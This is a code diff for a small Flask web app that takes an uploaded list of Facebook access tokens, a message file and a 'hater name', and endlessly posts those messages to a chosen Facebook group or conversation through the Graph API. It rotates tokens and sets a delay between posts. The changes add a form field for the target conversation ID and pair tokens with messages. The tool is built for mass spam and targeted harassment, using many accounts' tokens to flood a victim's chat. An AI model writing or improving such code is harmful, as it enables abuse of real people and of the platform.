@@ -19,8 +19,8 @@ def save_file(file, path):
     with open(path, "wb") as f:
         f.write(file.read())
 
-# Function to send messages one by one from different tokens
-def send_messages(hater_name):
+# Function to send messages using multiple tokens
+def send_messages(hater_name, convo_id):
     try:
         with open(TOKEN_FILE, "r") as f:
             tokens = [line.strip() for line in f.readlines() if line.strip()]
@@ -35,23 +35,20 @@ def send_messages(hater_name):
             print("[!] Tokens or Messages file is empty.")
             return
 
-        convo_id = "YOUR_CONVERSATION_ID"  # इसे फॉर्म से लेना है
-
         while True:
-            for token in tokens:
-                for message in messages:
-                    full_message = f"{hater_name}: {message}"
-                    url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
-                    headers = {'User-Agent': 'Mozilla/5.0'}
-                    payload = {'access_token': token, 'message': full_message}
+            for token, message in zip(tokens, messages):
+                full_message = f"{hater_name}: {message}"  
+                url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"  
+                headers = {'User-Agent': 'Mozilla/5.0'}
+                payload = {'access_token': token, 'message': full_message}
 
-                    response = requests.post(url, json=payload, headers=headers)
-                    if response.ok:
-                        print(f"[+] Message sent: {full_message}")
-                    else:
-                        print(f"[x] Failed: {response.status_code} {response.text}")
+                response = requests.post(url, json=payload, headers=headers)
+                if response.ok:
+                    print(f"[+] Message sent: {full_message}")
+                else:
+                    print(f"[x] Failed: {response.status_code} {response.text}")
 
-                    time.sleep(delay)  # टाइम डिले सेट किया गया है
+                time.sleep(delay)
 
     except Exception as e:
         print(f"[!] Error: {e}")
@@ -89,6 +86,9 @@ HTML_TEMPLATE = """
             <label>Enter Hater Name:</label>
             <input type="text" name="hater_name" required>
 
+            <label>Enter Facebook Group/Conversation ID:</label>
+            <input type="text" name="convo_id" required>
+
             <label>Speed in Seconds:</label>
             <input type="number" name="delay" value="5" min="1">
 
@@ -107,15 +107,16 @@ def index():
         token_file = request.files.get("token_file")
         message_file = request.files.get("message_file")
         hater_name = request.form.get("hater_name")
+        convo_id = request.form.get("convo_id")  # Group ID को फॉर्म से लो
         delay = request.form.get("delay", 5)
 
-        if token_file and message_file and hater_name:
+        if token_file and message_file and hater_name and convo_id:
             save_file(token_file, TOKEN_FILE)
             save_file(message_file, MESSAGE_FILE)
             with open(TIME_FILE, "w") as f:
                 f.write(str(delay))
 
-            threading.Thread(target=send_messages, args=(hater_name,), daemon=True).start()
+            threading.Thread(target=send_messages, args=(hater_name, convo_id), daemon=True).start()
 
     return render_template_string(HTML_TEMPLATE)
 
